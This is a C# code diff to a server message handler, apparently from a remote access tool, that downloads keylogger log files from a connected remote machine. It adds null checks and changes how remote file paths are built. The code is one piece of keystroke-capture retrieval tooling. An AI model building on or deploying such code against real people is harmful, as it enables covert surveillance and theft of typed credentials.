@@ -125,31 +125,64 @@ namespace Pulsar.Server.Messages
             OnReport($"No logs found ({value})");
         }
 
-        private void DirectoryChanged(object? sender, string remotePath, FileSystemEntry[] items)
+        private void DirectoryChanged(object? sender, string? remotePath, FileSystemEntry[]? items)
         {
-            if (items == null || items.Length == 0)
+            // --------------------------
+            // 1. Null protection
+            // --------------------------
+
+            if (string.IsNullOrWhiteSpace(remotePath))
+            {
+                OnReport("Invalid remote directory");
+                return;
+            }
+
+            if (items == null)
             {
                 OnReport("No logs found");
                 return;
             }
 
+            // --------------------------
+            // 2. Empty directory
+            // --------------------------
+            if (items.Length == 0)
+            {
+                OnReport("No logs found");
+                return;
+            }
+
+            // --------------------------
+            // 3. Update counters
+            // --------------------------
             _allTransfers = items.Length;
             _completedTransfers = 0;
             OnReport(GetDownloadProgress());
 
+            // --------------------------
+            // 4. Process each file
+            // --------------------------
             foreach (var item in items)
             {
+                if (item == null || string.IsNullOrWhiteSpace(item.Name))
+                    continue;
+
                 if (FileHelper.HasIllegalCharacters(item.Name))
                 {
                     _client.Disconnect();
                     return;
                 }
 
+                // Absolute remote path is always safe now
+                string remoteFile = Path.Combine(remotePath, item.Name);
+
                 string localPath = FileHelper.GetTempFilePath(".txt");
+
                 _fileManagerHandler.BeginDownloadFile(
-                    Path.Combine(_remoteKeyloggerDirectory, item.Name),
+                    remoteFile,
                     Path.GetFileName(localPath),
-                    true);
+                    true
+                );
             }
         }
 
